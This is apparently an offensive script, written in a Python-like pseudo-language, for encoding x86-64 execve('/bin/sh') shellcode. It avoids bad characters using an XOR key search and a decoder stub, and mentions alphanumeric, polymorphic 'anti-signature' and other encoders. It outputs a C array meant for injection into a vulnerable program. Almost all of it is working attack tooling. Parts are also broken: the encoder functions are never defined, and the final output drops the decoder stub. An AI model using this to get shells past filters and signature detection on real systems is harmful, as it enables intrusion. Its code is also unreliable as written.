# Shellcode encoding to bypass badchars and filters
# Common in restricted environment challenges

print("[*] Shellcode Encoding and Badchar Bypass")

# Original shellcode (execve /bin/sh)
let original_shellcode = [
    0x48, 0x31, 0xf6,              # xor rsi, rsi
    0x56,                          # push rsi
    0x48, 0xbf, 0x2f, 0x62, 0x69,  # mov rdi, "/bin/sh"
    0x6e, 0x2f, 0x73, 0x68, 0x00,
    0x57,                          # push rdi
    0x54,                          # push rsp
    0x5f,                          # pop rdi
    0x6a, 0x3b,                    # push 59 (execve)
    0x58,                          # pop rax
    0x99,                          # cdq
    0x0f, 0x05                     # syscall
]

print("[*] Original shellcode size:", len(original_shellcode), "bytes")

# Define badchars (common: null, newline, space, etc.)
let badchars = [0x00, 0x0a, 0x0d, 0x20]
print("[*] Bad characters:", hex(badchars))

# Check if original shellcode has badchars
define function has_badchars(shellcode, badchars) {
    for byte in shellcode {
        if byte in badchars {
            return true
        }
    }
    return false
}
if has_badchars(original_shellcode, badchars) {
    print("[!] Shellcode contains badchars - encoding required")
} else {
    print("[+] Shellcode is clean!")
}
# Encoding Strategy 1: XOR Encoder
print("\n[*] Encoding Strategy 1: XOR Encoder")

define function xor_encode(data, key) {
    let encoded = []
    for i in range(len(data)) {
        let encoded_byte = data[i] ^ key
        encoded = encoded + [encoded_byte]
    }
    return encoded
}
# Find a key that doesn't create badchars
let encoder_key = 0
for test_key in range(1, 256) {
    let encoded = xor_encode(original_shellcode, test_key)
    if has_badchars(encoded, badchars) == false {
        encoder_key = test_key
        break
    }
}
print("[+] Found XOR key:", hex(encoder_key))

let xor_encoded = xor_encode(original_shellcode, encoder_key)

# Generate decoder stub (will run first to decode real shellcode)
let decoder_stub = [
    0xeb, 0x0b,                    # jmp short +11
    0x5e,                          # pop rsi (get shellcode address)
    0x31, 0xc9,                    # xor ecx, ecx
    0xb1, len(original_shellcode), # mov cl, shellcode_length
    0x80, 0x36, encoder_key,       # xor byte [rsi], key
    0x46,                          # inc esi
    0xe2, 0xfa,                    # loop -6
    0xeb, 0x05,                    # jmp shellcode
    0xe8, 0xf0, 0xff, 0xff, 0xff   # call -16
]

let final_shellcode_xor = decoder_stub + xor_encoded
print("[+] XOR encoded size:", len(final_shellcode_xor), "bytes")

# Encoding Strategy 2: Alpha-numeric encoder
print("\n[*] Encoding Strategy 2: Alpha-numeric Encoder")

# This creates shellcode using only alphanumeric characters
# Useful for injection into strings or strict filters
let alphanum_shellcode = alphanumeric_encode(original_shellcode)
print("[+] Alphanumeric size:", len(alphanum_shellcode), "bytes")

# Encoding Strategy 3: Polymorphic encoder
print("\n[*] Encoding Strategy 3: Polymorphic Encoder")

# Creates different output each time (anti-signature)
let poly_shellcode = polymorphic_encode(original_shellcode)
print("[+] Polymorphic size:", len(poly_shellcode), "bytes")

# Encoding Strategy 4: Unicode encoder (for UTF-16 environments)
print("\n[*] Encoding Strategy 4: Unicode Encoder")

let unicode_shellcode = unicode_encode(original_shellcode)
print("[+] Unicode size:", len(unicode_shellcode), "bytes")

# Encoding Strategy 5: Custom encoder for specific badchars
print("\n[*] Encoding Strategy 5: SUB Encoder (no nulls)")

# Uses SUB instructions to build shellcode
let sub_encoded = sub_encode(original_shellcode)
print("[+] SUB encoded size:", len(sub_encoded), "bytes")

# Test encoded shellcode (in safe sandbox)
print("\n[*] Testing encoded shellcode...")

define function test_shellcode(shellcode) {
    # Create test file
    write("/tmp/test_shellcode", shellcode)
    
    # Try to execute (in safe container)
    # In real scenario, inject into vulnerable program
    print("[*] Shellcode test complete")
}
# Select best encoder based on size and requirements
let best_shellcode = xor_encoded
if len(alphanum_shellcode) < len(best_shellcode) {
    best_shellcode = alphanum_shellcode
    print("\n[+] Best encoder: Alphanumeric")
} else {
    print("\n[+] Best encoder: XOR")
}
# Output final encoded shellcode
print("[*] Final shellcode:")
print(hex(best_shellcode))

# Generate C array for injection
define function to_c_array(data) {
    let output = "unsigned char shellcode[] = {\n  "
    for i in range(len(data)) {
        output = output + "0x" + hex(data[i])[2..] + ", "
        if (i + 1) % 12 == 0 {
            output = output + "\n  "
        }
    }
    output = output + "\n};"
    return output
}
let c_code = to_c_array(best_shellcode)
write("/tmp/shellcode.c", c_code)
print("\n[+] C array written to /tmp/shellcode.c")
